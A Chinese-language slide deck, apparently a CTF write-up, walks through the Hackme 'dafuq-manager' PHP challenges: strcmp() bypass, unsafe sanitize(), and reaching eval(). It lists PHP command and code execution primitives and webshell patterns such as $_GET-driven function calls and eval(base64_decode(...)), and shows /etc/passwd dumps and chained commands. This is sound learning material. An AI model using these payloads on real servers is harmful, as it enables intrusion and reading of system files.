### 第一次解 
# [Hackme CTF](https://hackme.inndy.tw/)
### 就上手

jason3e7 20181128

---

# Web
* [dafuq-manager 1](#/2)
* [dafuq-manager 2](#/3)
* [dafuq-manager 3](#/10)

---

## dafuq-manager 1 hint
* ```Do you know cookie? Create a cookie named `help` with value `me`!```
* [Back to Web](#/1)

---

## dafuq-manager 2 hint
* 目標 : 登入 admin
* 如果可以快速架環境, 就架環境.(黑箱變成白箱)
  * conf, https -> http
* 分析權限管控機制, 登入流程
* 切入點
  * bypass權限管控, 直接顯示 admin 頁面
  * 登入驗證
    * Injection
  * 抓取密碼檔 
    * Path Traversal

Note:index.php?action=x

---

### dafuq-manager 2 - 分析權限管控機制
* index.php(action = admin)
  * /core/fun_admin.php
    * show_admin()
      * $GLOBALS["permissions"] from activate_user().

---

### dafuq-manager 2 - 分析登入流程
* /core/login.php
  * activate_user()
    * md5(stripslashes($p_pass)))
  * /core/fun_users.php
    * /.config/.htusers.php, 帳號資料檔(包含密碼)
    * &find_user()

---

### dafuq-manager 2 - bypass權限管控, 直接顯示 admin 頁面
* /core/login.php
  * activate_user()
  * /core/fun_users.php
    * /.config/.htusers.php, $GLOBALS["permissions"]都從這包帶出.
* 目前沒有辦法走這條路 Compromise. 

---

## dafuq-manager 2 - 登入驗證
* &find_user function
  * $pass == NULL
    * 如果是等於 0, 就有[Magic Hashes](https://www.whitehatsec.com/blog/magic-hashes/)可以用.
  * 不是 SQL, 沒有 SQL injection
* 目前沒有辦法走這條路 Compromise. 

---

## dafuq-manager 2 - 抓取密碼檔
* search and list
  * 只顯示檔案不是存取
* download
  * basename(), protect
* arch
  * I got you !
* debug
  * dafuq-manager 3 的入口

---

## dafuq-manager 2 - arch
* /core/fun_archive.php
  * zip_items
    * ```$GLOBALS['__POST']["selitems"][$i]```
    * sanitize()
* /core/secure.php
  * sanitize(), 不安全
* [Back to Web](#/1)

---

## dafuq-manager 3 hint
* 目標 : 使用 webshell, 取得網站目錄底下的 flag 
* 切入點
  * /core/fun_debug.php
    * eval()  
* 步驟
  * [step 1, bypass strcmp()](#/11)
  * [step 2, construct webshell](#/15)
    * make_command()
  * [step 3, linux !?](#/21)
    * 以為要提權, 實際上不用, 寫對語法就好.

Note:index.php?action=x

---

## dafuq-manager 3 debug
* /core/init.php
  * $GLOBALS["dir"]
* /core/fun_debug.php
  * strcmp($dir, "magically")...
  * [Unauthorized Access: Bypassing PHP strcmp()](http://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html)
* [Back to dafuq-manager 3 hint](#/10)

---

## dafuq-manager 3 learn
* php 執行系統外部命令
  * system('ls');
  * passthru('ls');
  * print(exec('ls'));
  * print(shell_exec('ls'));
  * print(\`ls\`); 
  * print(fread(popen('ls', 'r'), 2096));

Note:escapeshellcmd()

---

## dafuq-manager 3 learn
* php 執行系統外部命令
  * proc_open
    * ```$process = proc_open('ls', array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")), $pipes); print(stream_get_contents($pipes[1]));```
  * pcntl_exec, 需要補充
  * ob_start(), 需要補充

---

## dafuq-manager 3 learn
* php 執行php外部命令
  * eval("phpinfo();");
  * assert(), 需要補充
  * print(preg_replace_callback('/cmd/e', phpinfo(), 'cmd'));
  * $func = create_function('$arg1', 'phpinfo();'); $func(1);

Note:
eval(base64_decode('c3lzdGVtKCdscycpOw=='));

---

## dafuq-manager 3 learn
* php 執行php外部命令
  * array_map('phpinfo', array(0, 1));
    * 限制只有 function name
  * ```$_GET["func"]($_GET["argument"]);```
* [Back to dafuq-manager 3 hint](#/10)

Note: ReflectionFunction()

---

## dafuq-manager 3 learn
* php, code inclusion
  * include
  * include_once
  * require
  * require_once
  * curl, 需要補充, 不一定在這個分類.

Note:
[Exploitable PHP functions](https://stackoverflow.com/questions/3115559/exploitable-php-functions)

```include("data:text/plain;base64,$_GET[code]");```, need test.

順便有的 keyword : 
* [利用環境變數LD_PRELOAD來繞過php disable_function執行系統命令 <轉載>](https://codertw.com/%E4%BC%BA%E6%9C%8D%E5%99%A8/138881/)
* [Exploit with PHP Protocols / Wrappers](https://www.cdxy.me/?p=752)
* [Finding vulnerabilities in PHP scripts (FULL)](https://www.exploit-db.com/papers/12871)
* [Web-shells 101 using PHP – Introduction to Web Shells – Part 2](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/)
* [List of PHP Exploitation Code](https://securityonline.info/list-php-exploitation-codephp-exploitation-codephp-object-injectioncommand-execution/)
* [File Operation Induced Unserialization via the “phar://” Stream Wrapper](https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf)
* [php代码/命令执行漏洞](https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/)

---

## dafuq-manager 3 linux
* /etc/passwd
  * UID
  * GID
* /etc/group
  * 支援的帳號名稱

---

## dafuq-manager 3 /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
flag3:x:1001:1001::/home/flag3:
```

---

## dafuq-manager 3 /etc/group
```
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-timesync:x:102:
systemd-network:x:103:
systemd-resolve:x:104:
systemd-bus-proxy:x:105:
flag3:x:1001:
```

---

## dafuq-manager 3 webshell
* whoami
  * www-data
* file
  * flag3/meow: setuid, setgid executable, regular file, no read permission
  * flag3/flag3: regular file, no read permission

---

## dafuq-manager 3 webshell
* ls -al flag3/
```
total 32
drwxr-xr-x  2 root  root  4096 Jan 25  2018 .
drwxr-xr-x 13 root  root  4096 Jul 30 08:33 ..
-rw-r--r--  1 root  root   161 Oct  4  2016 Makefile
-r--------  1 flag3 flag3   72 Oct  4  2016 flag3
-rws--s--x  1 flag3 flag3 9232 Oct  4  2016 meow
-rw-r--r--  1 root  root   783 Oct  4  2016 meow.c
```
* [Back to dafuq-manager 3 hint](#/10)

Note:[Web渗透测试（4）—本地提权方法](https://www.jianshu.com/p/955e6715c450)
ls;whoami;

---

# The End
